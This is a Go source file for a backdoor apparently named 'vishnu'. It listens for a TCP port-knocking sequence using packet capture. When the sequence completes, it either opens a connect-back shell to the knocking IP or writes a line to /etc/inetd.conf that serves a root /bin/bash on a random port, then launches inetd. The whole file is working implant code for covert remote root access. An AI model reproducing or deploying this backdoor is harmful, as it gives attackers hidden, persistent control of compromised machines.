package main

import (
	"errors"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"vishnu/spec"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type targetInfo struct {
	os      string
	iFace   string
	snaplen int32
	// vishnu uses tcp port knocking
	filter string
	// ports in order to port knock on
	secretPorts []int
	// how far into the sequence we are
	// when secretCounter == len(secretPorts),
	// port knocking is complete and shell is given
	secretCounter   int
	lastPort        layers.TCPPort
	connectback     bool
	connectbackPort string
}

// create target info struct
func sInit(os string) *targetInfo {
	tInfo := targetInfo{}

	tInfo.os = os
	tInfo.iFace = spec.GetAdapter()

	tInfo.snaplen = int32(1600)
	tInfo.filter = "tcp"
	tInfo.secretPorts = []int{1, 2, 3, 4}
	tInfo.secretCounter = 0

	// if true, connect back to knocking
	// IP on connectbackPort
	tInfo.connectback = false
	// only relevant if connectback is true
	tInfo.connectbackPort = "8080"

	return &tInfo
}

func main() {
	tInfo := sInit(runtime.GOOS)

	// Read package and analze them
	handle, err := pcap.OpenLive(tInfo.iFace, tInfo.snaplen, true, pcap.BlockForever)
	errorPrinter(err)

	handle.SetBPFFilter(tInfo.filter)
	packets := gopacket.NewPacketSource(handle, handle.LinkType()).Packets()
	for pkt := range packets {
		// Your analysis here! Get the important stuff
		printPacketInfo(pkt, tInfo)
	}
}

func vishnu(ip string, tInfo *targetInfo) {
	if tInfo.connectback || tInfo.os == "windows" {
		spec.ConnectBack(ip, tInfo.connectbackPort)
	} else {
		randomPort := rand.Intn(65535-100) + 100
		// println("The doors are open on port ", strconv.Itoa(randomPort))
		// Append to a file /etc/inetd.conf
		fd, err := os.OpenFile("/etc/inetd.conf", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		errorPrinter(err)
		defer fd.Close()

		if _, err = fd.WriteString(strconv.Itoa(randomPort) + " stream tcp nowait root /bin/bash bash\n"); err != nil {
			log.Panicln(err)
		}

		exec.Command("/usr/sbin/inetd").Run()
	}
}

func grabRemoteIP(packet gopacket.Packet) (string, error) {
	iplayer := packet.Layer(layers.LayerTypeIPv4)
	if iplayer == nil {
		return "", errors.New("Packet is not IPv4")
	}

	ip, _ := iplayer.(*layers.IPv4)
	return ip.SrcIP.String(), nil
}

func printPacketInfo(packet gopacket.Packet, tInfo *targetInfo) {
	// Let's see if the packet is TCP
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	if tcpLayer != nil {
		tcp, _ := tcpLayer.(*layers.TCP)

		// Check the TCP Flag
		if tcp.SYN {
			// fmt.Printf("From port %d to %d\n", tcp.SrcPort, tcp.DstPort)
			// Check dst port for secret port
			tInfo.lastPort = tcp.DstPort

			if tcp.DstPort == layers.TCPPort(tInfo.secretPorts[tInfo.secretCounter]) {
				tInfo.secretCounter++
				tInfo.lastPort = tcp.DstPort
			} else if tInfo.secretCounter != 0 && tInfo.lastPort == layers.TCPPort(tInfo.secretPorts[tInfo.secretCounter-1]) { // fixed TCP 2x duplication issue
				fmt.Println("duplicate tcp") // pass
			} else {
				// reset counter
				tInfo.secretCounter = 0
			}
		}
	}

	if tInfo.secretCounter == len(tInfo.secretPorts) {
		tInfo.secretCounter = 0
		// grab  IP address
		ip, err := grabRemoteIP(packet)
		// TODO maybe just listen if connectback is
		// on and we can't get the remote IP
		if tInfo.connectback && err != nil {
			return
		}

		// open the gateway
		go vishnu(ip, tInfo)
	}

	// Check for errors
	if err := packet.ErrorLayer(); err != nil {
		fmt.Println("Error decoding some part of the packet:", err)
	}
}

func errorPrinter(err error) {
	if err != nil {
		log.Panicln(err)
	}
}
